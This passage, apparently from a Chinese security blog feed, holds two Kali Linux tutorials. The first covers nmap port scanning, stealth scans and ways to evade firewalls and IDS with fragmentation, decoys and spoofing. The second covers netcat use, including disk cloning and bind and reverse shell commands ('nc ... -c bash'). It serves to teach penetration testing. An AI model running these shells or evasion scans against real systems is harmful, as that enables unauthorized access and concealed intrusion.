class="line">可是如果在这个子网里你已经知道某台机器的信息，不想再次扫描，需要用到-exclude参数来排除一些目标。示例：nmap 192.168.0.* --exclude 192.168.0.1</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200524160443887.png" alt="j4y" loading="lazy"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果你并不想扫描整个子网，而是同一子网下的多个目标，可以对IP地址的最后一位进行添加来执行扫描。示例：nmap 192.168.0.1,2,3这样nmap就会对这三个目标进行扫描。又或者可以使用nmap 192.168.0.1-10这样来指定多个扫描的目标也是可以的。</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果你已经有了一个信息列表，也可以保存成txt文件，而无需手动输入。示例：nmap -iL object.txt这样nmap就会对你txt文件中的每个目标进行扫描。</span><br></pre></td></tr></table></figure><p>4、得到目标的系统信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">得到目标系统的信息是必不可少的，我们为了得到系统信息和路由跟踪，需要-A参数来实现。示例：nmap -A 192.168.0.1</span><br><span class="line"></span><br><span class="line">当然，nmap是通过配对来实现操作系统信息的判别，所以nmap有时并不能准确识别出真实的信息，不提供任何信息或者提供好几种可能性都是正常的。</span><br><span class="line"></span><br><span class="line">-A并不是唯一的选择，-O和-osscan-guess都可以进行操作系统信息的探测。</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200524161217758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><p>5、检测目标保护措施</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">现在已经过了洪水攻击和DDoS的嚣张时刻，虽然大规模DDoS依旧恐怖，但是已经不在是首选的攻击手段。</span><br><span class="line"></span><br><span class="line">因为防护性的考虑，所以如果存在过滤规则或者防火墙的目标都会对数据包进行过滤。那么我们怎么知道目标是否存在这类的防护手段呢？</span><br><span class="line"></span><br><span class="line">我们可以采用-sA和-PN两个参数来进行探测扫描。</span><br></pre></td></tr></table></figure><p>6、扫描在线主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">扫描一个网段的过程中，如果目标并没有上线，有可能一无所获，所以在扫描之前可以先判断是否有主机存活。我们采用-sP参数来判断存活主机都有哪些。示例：nmap –sP192.168.0.*</span><br></pre></td></tr></table></figure><p>7、快速扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Nmap大多数扫描都是非常迅速的，但也有时会出现极其缓慢的情况，那么如果我只是想初步进行判断，而不是深入分析的话，一次快速扫描可以捕捉到你想要的大多数信息。</span><br><span class="line"></span><br><span class="line">示例：namp –F192.168.0.1</span><br><span class="line"></span><br><span class="line">这个参数扫描的范围仅限定在nmap-services这个文件中的端口，如果一般不加参数的命令，扫描范围是1000个最有可能开放的端口。</span><br></pre></td></tr></table></figure><p>8、判断版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">新的软件版本一般来讲会提供更好的性能和体验，所以紧跟时代形势，使用新版本的软件对我们来说也是至关重要的一点。</span><br><span class="line"></span><br><span class="line">我们可以通过-V来对安装的nmap版本进行查看，如果升级的话可以采用apt-get update（默认你使用的是Kali）</span><br></pre></td></tr></table></figure><p>9、特殊扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果你只是关心某个端口的开启情况，就没有必要让nmap从头到尾扫描一遍，则可以使用-p选项来指定你想要的那个端口。示例：nmap –p80 192.168.0.1或者nmap –p 80,443 192.168.0.1又或者nmap –p80-160 192.168.0.1</span><br><span class="line"></span><br><span class="line">按顺序扫描可以使用-r来实现，这样nmap不会随机进行扫描。示例：nmap –r192.168.0.1</span><br><span class="line"></span><br><span class="line">只扫描TCP端口和UDP端口分别使用-p T:80,8888和-sU 53来实现对某个特定端口的扫描。</span><br></pre></td></tr></table></figure><p>10、扫描本机的网络接口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本机的网络信息是不是只有ifconfig一个选择呢？显然不是，nmap也提供了-iflist来检测本机的信息。示例：nmap -iflist</span><br></pre></td></tr></table></figure><p>11、目标服务详细信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">目标开启的服务的版本也是我们应该关注的问题，在特定版本下所存在的漏洞都是我们应该加以利用的工具。</span><br><span class="line"></span><br><span class="line"> 示例：nmap –sV192.168.0.1</span><br></pre></td></tr></table></figure><p>12、所谓ACK和SYN扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> Ping的请求现在会被大多数的防火墙所拦截，直接丢弃数据包。但是我们可以采用TCPACK和TCP SYN的方式来进行扫描。</span><br><span class="line"></span><br><span class="line">通过向目标主机的端口发送ACK包，如果收到RST包，说明该端口没有被防火墙屏蔽；没有收到RST包，说明被屏蔽。</span><br><span class="line"></span><br><span class="line">SYN称为半开放扫描，因为这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。这个就是SYN扫描的优势。</span><br><span class="line">示例：nmap –PS192.168.0.1</span><br><span class="line"></span><br><span class="line">依旧只关心特定端口的扫描应该怎么做呢？示例：nmap –PA–p 80 192.168.0.1或者nmap –PS–p 80 192.168.0.1</span><br></pre></td></tr></table></figure><p>13、隐蔽扫描</p><p>大张旗鼓的多次扫描容易被防火墙记录下来，然后强行过滤，为了降低被发现的概率，我们可以采用隐蔽扫描。</p><p>示例：nmap –sS 192.168.0.1</p><p>14、使用TCP SYN扫描常用端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：nmap –sT 192.168.0.1</span><br></pre></td></tr></table></figure><p>15、TCP空扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：nmap -sN 192.168.0.1</span><br></pre></td></tr></table></figure><p>16、完整扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一次完整全面的扫描包括主机存活、操作系统版本探测、应用程序版本探测、端口扫描等等。</span><br><span class="line"></span><br><span class="line">示例：nmap –T4–A –v 192.168.0.1</span><br><span class="line"></span><br><span class="line">扫描速度共有6个（0-5）等级，一般来讲可以使用T4，速度越快越可能被过滤和屏蔽。-v是显示冗余信息</span><br></pre></td></tr></table></figure><p>17、主机发现的详细参数</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">-sL</span>:List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现。</span><br><span class="line"></span><br><span class="line"><span class="literal">-sn</span>:Ping Scan 只进行主机发现，不进行端口扫描。</span><br><span class="line"></span><br><span class="line"><span class="literal">-Pn</span>:将所有指定的主机视作开启的，跳过主机发现的过程。</span><br><span class="line"></span><br><span class="line"><span class="literal">-PS</span>/PA/PU/PY[<span class="type">portlist</span>]:使用TCPSYN/ACK或SCTP INIT/<span class="built_in">ECHO</span>方式进行发现。</span><br><span class="line"></span><br><span class="line"><span class="literal">-PE</span>/PP/PM:使用ICMPecho, timestamp, and netmask 请求包发现主机。<span class="literal">-PO</span>[<span class="type">protocollist</span>]:使用IP协议包探测对方主机是否开启。</span><br><span class="line"></span><br><span class="line"><span class="literal">-n</span>/<span class="literal">-R</span>:<span class="literal">-n</span>表示不进行DNS解析；<span class="literal">-R</span>表示总是进行DNS解析。</span><br><span class="line"></span><br><span class="line">-<span class="literal">-dns</span><span class="literal">-servers</span>&lt;serv1[,<span class="type">serv2</span>],...&gt;: 指定DNS服务器。</span><br><span class="line"></span><br><span class="line">-<span class="literal">-system</span><span class="literal">-dns</span>:指定使用系统的DNS服务器</span><br><span class="line"></span><br><span class="line">-<span class="literal">-traceroute</span>:追踪每个路由节点</span><br></pre></td></tr></table></figure><p>18、端口扫描详细参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TCP FIN/Xmas/NULL扫描。这三种扫描方式被称为秘密扫描（Stealthy Scan），因为相对比较隐蔽。FIN扫描向目标主机的端口发送的TCP FIN包或Xmas tree包/Null包，如果收到对方RST回复包，那么说明该端口是关闭的；没有收到RST包说明端口可能是开放的或被屏蔽的（open|filtered）。</span><br></pre></td></tr></table></figure><p>其中Xmas tree包是指flags中FIN URG PUSH被置为1的TCP包；NULL包是指所有flags都为0的TCP包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimonscans的方式来对目标主机进行扫描。</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况。</span><br><span class="line"></span><br><span class="line">-sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态。</span><br><span class="line"></span><br><span class="line">--scanflags &lt;flags&gt;: 定制TCP包的flags。</span><br><span class="line"></span><br><span class="line">-sI &lt;zombiehost[:probeport]&gt;: 指定使用idle scan方式来扫描目标主机（前提需要找到合适的zombie host）</span><br><span class="line"></span><br><span class="line">-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况。</span><br><span class="line"></span><br><span class="line">-sO: 使用IP protocol 扫描确定目标机支持的协议类型。</span><br><span class="line"></span><br><span class="line">-b &lt;FTP relay host&gt;: 使用FTP bouncescan扫描方式</span><br></pre></td></tr></table></figure><p>19、版本检测详细参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-sV:指定让Nmap进行版本侦测</span><br><span class="line"></span><br><span class="line">--version-intensity&lt;level&gt;: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。</span><br><span class="line"></span><br><span class="line">--version-light:指定使用轻量侦测方式 (intensity 2)</span><br><span class="line"></span><br><span class="line">--version-all:尝试使用所有的probes进行侦测 (intensity 9)</span><br><span class="line"></span><br><span class="line">--version-trace:显示出详细的版本侦测过程信息。</span><br></pre></td></tr></table></figure><p>20、规避检测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">现在防火墙和IDS的检测能力也并非没有长进，为了防止被检测出来，我们需要完整的规避检测的方案。</span><br></pre></td></tr></table></figure><p>20.1 分片（Fragmentation）</p><p>将可疑的探测包进行分片处理（例如将TCP包拆分成多个IP包发送过去），某些简单的防火墙为了加快处理速度可能不会进行重组检查，以此避开其检查。</p><p>20.2 IP诱骗（IP decoys）</p><p>在进行扫描时，将真实IP地址和其他主机的IP地址（其他主机需要在线，否则目标主机将回复大量数据包到不存在的主机，从而实质构成了拒绝服务攻击）混合使用，以此让目标主机的防火墙或IDS追踪检查大量的不同IP地址的数据包，降低其追查到自身的概率。注意，某些高级的IDS系统通过统计分析仍然可以追踪出扫描者真实IP地址。</p><p>20.3 IP伪装（IP Spoofing）</p><p>顾名思义，IP伪装即将自己发送的数据包中的IP地址伪装成其他主机的地址，从而目标机认为是其他主机在与之通信。需要注意，如果希望接收到目标主机的回复包，那么伪装的IP需要位于统一局域网内。另外，如果既希望隐蔽自己的IP地址，又希望收到目标主机的回复包，那么可以尝试使用idle scan或匿名代理（如TOR）等网络技术。</p><p>20.4 指定源端口</p><p>某些目标主机只允许来自特定端口的数据包通过防火墙。例如FTP服务器配置为：允许源端口为21号的TCP包通过防火墙与FTP服务端通信，但是源端口为其他端口的数据包被屏蔽。所以，在此类情况下，可以指定Nmap将发送的数据包的源端口都设置特定的端口。</p><p>20.5 扫描延时</p><p>某些防火墙针对发送过于频繁的数据包会进行严格的侦查，而且某些系统限制错误报文产生的频率（例如，Solaris 系统通常会限制每秒钟只能产生一个ICMP消息回复给UDP扫描），所以，定制该情况下发包的频率和发包延时可以降低目标主机的审查强度、节省网络带宽。</p><p>20.6 其他技术</p><p>Nmap 还提供多种规避技巧，比如指定使用某个网络接口来发送数据包、指定发送包的最小长度、指定发包的 MTU、指定TTL、指定伪装的MAC地址、使用错误检查和（badchecksum）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-f;--mtu &lt;val&gt;: 指定使用分片、指定数据包的MTU.</span><br><span class="line"></span><br><span class="line">-D&lt;decoy1,decoy2[,ME],...&gt;: 用一组IP地址掩盖真实地址，其中ME填入自己的IP地址。</span><br><span class="line"></span><br><span class="line">-S&lt;IP_Address&gt;: 伪装成其他IP地址</span><br><span class="line"></span><br><span class="line">-e&lt;iface&gt;: 使用特定的网络接口</span><br><span class="line"></span><br><span class="line">-g/--<span class="built_in">source</span>-port&lt;portnum&gt;: 使用指定源端口</span><br><span class="line"></span><br><span class="line">--data-length&lt;num&gt;: 填充随机数据让数据包长度达到Num。</span><br><span class="line"></span><br><span class="line">--ip-options&lt;options&gt;: 使用指定的IP选项来发送数据包。</span><br><span class="line"></span><br><span class="line">--ttl&lt;val&gt;: 设置time-to-live时间。</span><br><span class="line"></span><br><span class="line">--spoof-mac&lt;mac address/prefix/vendor name&gt;: 伪装MAC地址</span><br><span class="line"></span><br><span class="line">--badsum:使用错误的checksum来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或IDS/IPS）。</span><br></pre></td></tr></table></figure><p>22、定制数据包</p><p>Nmap 提供–scanflags 选项，用户可以对需要发送的TCP探测包的标志位进行完全的控制。可以使用数字或符号指定TCP标志位：URG, ACK, PSH,RST, SYN,and FIN。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">另外使用--ip-options可以定制IP包的options字段。使用-S指定虚假的IP地址，-D指定一组诱骗IP地址（ME代表真实地址）。-e指定发送探测包的网络接口，-g（--<span class="built_in">source</span>-port）指定源端口，-f指定使用IP分片方式发送探测包，--spoof-mac指定使用欺骗的MAC地址。--ttl指定生存时间。</span><br></pre></td></tr></table></figure><p>23、扫描路由器</p><p>Nmap 内部维护了一份系统与设备的数据库（nmap-os-db），能够识别数千种不同系统与设备。所以，可以用来扫描主流的路由器设备。</p><p>23.1扫描路由器TFTP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：nmap –sU–p 69 –nvv target</span><br></pre></td></tr></table></figure><p>大多数的路由器都支持TFTP协议（简单文件传输协议），该协议常用于备份和恢复路由器的配置文件，运行在UDP 69端口上。使用上述命令可以探测出路由器是否开放TFTP。</p><p>23.2扫描路由器操作系统</p><p>与通用PC扫描方式类似，使用-O选项扫描路由器的操作系统。-F用于快速扫描最可能开放的100个端口，并根据端口扫描结果进一步做OS的指纹分析。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：nmap -O -F -n 192.168.1.1</span><br></pre></td></tr></table></figure><p>24、扫描Web站点</p><p>Web是互联网上最广泛的应用，而且越来越多的服务倾向于以Web形式提供出来，所以对Web安全监管也越来越重要。目前安全领域有很多专门的Web扫描软件（如AppScan、WebInspect、W3AF），能够提供端口扫描、漏洞扫描、漏洞利用、分析报表等诸多功能。而Nmap作为一款开源的端口扫描器，对Web扫描方面支持也越来越强大，可以完成Web基本的信息探测：服务器版本、支持的Method、是否包含典型漏洞。功能已经远远超过同领域的其他开源软件，如HTTPrint、Httsquash。</p><p>目前Nmap中对Web的支持主要通过Lua脚本来实现，NSE脚本库中共有50多个HTTP相关的脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：nmap -sV -p 80 -T4 --scripthttp*,defaultscanme.nmap.org</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali神器之实用工具的基本使用</title>
      <link href="/2020/08/23/kali%E7%A5%9E%E5%99%A8%E4%B9%8B%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8(%E8%AF%A6%E7%BB%86)/"/>
      <url>/2020/08/23/kali%E7%A5%9E%E5%99%A8%E4%B9%8B%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8(%E8%AF%A6%E7%BB%86)/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开始进行kali linux学习（修仙ing）</p><p>本文主要目标是基本工具的了解与使用。</p><h1 id="NETCAT——NC"><a href="#NETCAT——NC" class="headerlink" title="NETCAT——NC"></a>NETCAT——NC</h1><ul><li>网络工具中的瑞士军刀——小身材，大智慧。</li><li>侦听模式/传输模式</li><li>telnet / 获取banner信息</li><li>传输文本信息</li><li>传输文件/目录</li><li>加密传输文件</li><li>远程控制/木马</li><li>加密所有流量</li><li>流媒体服务器</li><li>远程克隆硬盘<h2 id="NC——TELNET-BANNER"><a href="#NC——TELNET-BANNER" class="headerlink" title="NC——TELNET/BANNER"></a>NC——TELNET/BANNER</h2>获取banner信息<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="literal">-nv</span> <span class="number">1.1</span>.<span class="number">1.1</span> <span class="number">110</span> //pop3服务</span><br><span class="line">nc <span class="literal">-nv</span> <span class="number">1.1</span>.<span class="number">1.1</span> <span class="number">25</span>  //smtp服务</span><br><span class="line">nc <span class="literal">-nv</span> <span class="number">1.1</span>.<span class="number">1.1</span> <span class="number">80</span>  //http服务</span><br></pre></td></tr></table></figure>关于获取banner信息还有许多其他的工具可以利用，比如nmap还有dmitry都是kali自带的工具，都可以进行banner信息的获取。不一一举例。<br>通过<code>nc -h</code>查看功能<br><img src="https://img-blog.csdnimg.cn/20200525122525586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><h2 id="NC——传输文本信息"><a href="#NC——传输文本信息" class="headerlink" title="NC——传输文本信息"></a>NC——传输文本信息</h2>这个功能可以用来连接两台主机。进行聊天对话沟通。</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A: nc <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">4444</span></span><br><span class="line">B: nc <span class="literal">-nv</span> <span class="number">1.1</span>.<span class="number">1.1</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure><p>第一台主机代表服务端需要先侦听一个端口，使用第一条命令，<code>-l</code>代表listen，也就是听的意思，<code>-p</code>指的是端口，意思就是告诉nc我想要侦听4444端口。<br>第二台主机代表客户端，使用nc连接服务端的这个端口，就可以进行聊天。前提条件是，<strong>客户端必须知道服务端开启的端口和IP地址。</strong><br>连接状态一方终止两边都会终止。</p><h2 id="NC——传输文件-目录"><a href="#NC——传输文件-目录" class="headerlink" title="NC——传输文件/目录"></a>NC——传输文件/目录</h2><h3 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A: nc <span class="literal">-lp</span> <span class="number">333</span> &gt; <span class="number">1</span>.mp4     <span class="comment">#接收端</span></span><br><span class="line">B: nc <span class="literal">-nv</span> <span class="number">1.1</span>.<span class="number">1.1</span> <span class="number">333</span> &lt; <span class="number">1</span>.mp4 <span class="literal">-q</span> <span class="number">1</span>    <span class="comment">#发送端</span></span><br></pre></td></tr></table></figure><p>接收端表示侦听一个333端口，并将接受的文件输出到1.MP4文件。<br>发送端表示nc连接输入文件进行发送。<code>-q 1</code>表示如果传送结束1秒后自动退出服务。(文件比较大的话可以使用这个比较方便)<br>简单来说就是A开启服务后，等待着B来给他发送文件。<br>或者使用这样的方式传输文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A: nc <span class="literal">-q</span> <span class="number">1</span> <span class="literal">-lp</span> <span class="number">333</span> &lt; a.mp4</span><br><span class="line">B: nc <span class="literal">-nv</span> <span class="number">1.1</span>.<span class="number">1.1</span> <span class="number">333</span> &gt; <span class="number">2</span>.mp4</span><br></pre></td></tr></table></figure><p>A作为发送端，先将服务开启，然后B进行连接，一旦连接成功，就会进行传输，完成后一秒关闭连接。<br>这个是A开启服务后，准备一个文件，然后等待B来连接它并接收这个文件。<br>以上是两种传输方式，可以A传输给B也可以B传输给A。</p><h3 id="传输目录"><a href="#传输目录" class="headerlink" title="传输目录"></a>传输目录</h3><p>目录的传输也可以双向传输，与上述文件传输类似。下面只写一个方向。<br>可以使用以下命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A: tar <span class="literal">-cvf</span> <span class="literal">-music</span>/ | nc <span class="literal">-lp</span> <span class="number">333</span> <span class="literal">-q</span> <span class="number">1</span></span><br><span class="line">B: nc <span class="literal">-nv</span> <span class="number">1.1</span>.<span class="number">1.1</span> <span class="number">333</span> | tar <span class="literal">-xvf</span> -</span><br></pre></td></tr></table></figure><p><code>cvf</code>是将文件打包的作用，然后将打包后的文件灌输到管道中，使用nc进行传输。等待B连接。<br>B连接后接收到来自A端的文件，使用<code>xvf</code>解压tar包。还原成目录。</p><h3 id="加密传输文件"><a href="#加密传输文件" class="headerlink" title="加密传输文件"></a>加密传输文件</h3><p>使用命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A: mcrypt -<span class="literal">-flush</span> <span class="literal">-Fbq</span> <span class="literal">-a</span> rijndael<span class="literal">-256</span> <span class="literal">-m</span> ecb &lt; a.mp4 | nc <span class="literal">-nv</span> <span class="number">1.1</span>.<span class="number">1.1</span> <span class="number">333</span> <span class="literal">-q</span> <span class="number">1</span></span><br><span class="line">B: nc <span class="literal">-lp</span> <span class="number">333</span> | mcrypt -<span class="literal">-flush</span> <span class="literal">-Fbqd</span> <span class="literal">-a</span> rijndael<span class="literal">-256</span> <span class="literal">-m</span> ecb &gt; <span class="number">1</span>.mp4</span><br></pre></td></tr></table></figure><p>这个是不用记的，毕竟这么长。<br>输入完整命令后，在A端也就是发送端会提示让输入密码(自己设置)，设置密码后，再次进行输入(密码不显示，直接输入就行)。<br>在B端进行连接就会提示输入密码。这个密码就是A端设置的密码。输入正确就就可以接收。<br><strong>注</strong>:这个加密并不是nc自带的加密方式。而是利用了另一个程序的功能。这个程序名叫mcrypt，这个kali里面没有自带，需要自行安装。<br>安装方法直接用apt-get包管理器就行。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt<span class="literal">-get</span> install mcrypt <span class="literal">-y</span></span><br></pre></td></tr></table></figure><h2 id="NC——流媒体服务器"><a href="#NC——流媒体服务器" class="headerlink" title="NC——流媒体服务器"></a>NC——流媒体服务器</h2><p>使用命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A: <span class="built_in">cat</span> <span class="number">1</span>.mp4 | nc <span class="literal">-lp</span> <span class="number">333</span>     <span class="comment"># 服务端</span></span><br><span class="line">B: nc <span class="literal">-nv</span> <span class="number">1.1</span>.<span class="number">1.1</span> <span class="number">333</span> | mplayer <span class="literal">-vo</span> x11 <span class="literal">-cache</span> <span class="number">3000</span>-      <span class="comment"># 客户端</span></span><br></pre></td></tr></table></figure><p>cat是查看文本信息的，这里也可以用来查看1.MP4的信息<br>mplayer是一个媒体播放应用。<br>cache 3000  表示缓存大小。</p><h2 id="NC——端口扫描"><a href="#NC——端口扫描" class="headerlink" title="NC——端口扫描"></a>NC——端口扫描</h2><p>端口扫描有好多工具可以使用。比如：nmap、Dmitry、netcat(也就是nc)，这些都是kali当中自带的工具。<br>这里主要介绍学习nc<br>其他的后续可能会写。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="literal">-nvz</span> IP地址 端口范围</span><br><span class="line">如：nc <span class="literal">-nvz</span> <span class="number">192.168</span>.<span class="number">40.138</span> <span class="number">1</span><span class="literal">-5000</span></span><br></pre></td></tr></table></figure><h2 id="NC——远程克隆硬盘"><a href="#NC——远程克隆硬盘" class="headerlink" title="NC——远程克隆硬盘"></a>NC——远程克隆硬盘</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A: nc <span class="literal">-lp</span> <span class="number">333</span> | dd of=/dev/sda   <span class="comment">#接收方</span></span><br><span class="line">B: dd <span class="keyword">if</span>=/dev/sda | nc <span class="literal">-nv</span> <span class="number">1.1</span>.<span class="number">1.1</span> <span class="number">333</span> <span class="literal">-q</span> <span class="number">1</span>   <span class="comment">#这里B相当于被取证的电脑</span></span><br></pre></td></tr></table></figure><ul><li>远程电子取证，可以将目标服务器硬盘远程复制或者内存。<br>if相当于inputfile(输入)<br>of相当于outputfile(输出)<h2 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#正向</span></span><br><span class="line">A: nc <span class="literal">-lp</span> <span class="number">333</span> <span class="literal">-c</span> bash  <span class="comment">#服务器端</span></span><br><span class="line">B: nc <span class="number">1.1</span>.<span class="number">1.1</span> <span class="number">333</span>      <span class="comment">#客户端</span></span><br><span class="line"><span class="comment">#反向</span></span><br><span class="line">A: nc <span class="literal">-lp</span> <span class="number">333</span>           <span class="comment">#客户端</span></span><br><span class="line">B: nc <span class="number">1.1</span>.<span class="number">1.1</span> <span class="number">333</span> <span class="literal">-c</span> bash    <span class="comment">#服务器端</span></span><br></pre></td></tr></table></figure>这里利用shell使得用nc连接的用户可以进行远程控制<br>bash是linux系统自带的shell。</li></ul><p><strong>注</strong>：windows用户把bash改成cmd</p><h2 id="NC——NCAT"><a href="#NC——NCAT" class="headerlink" 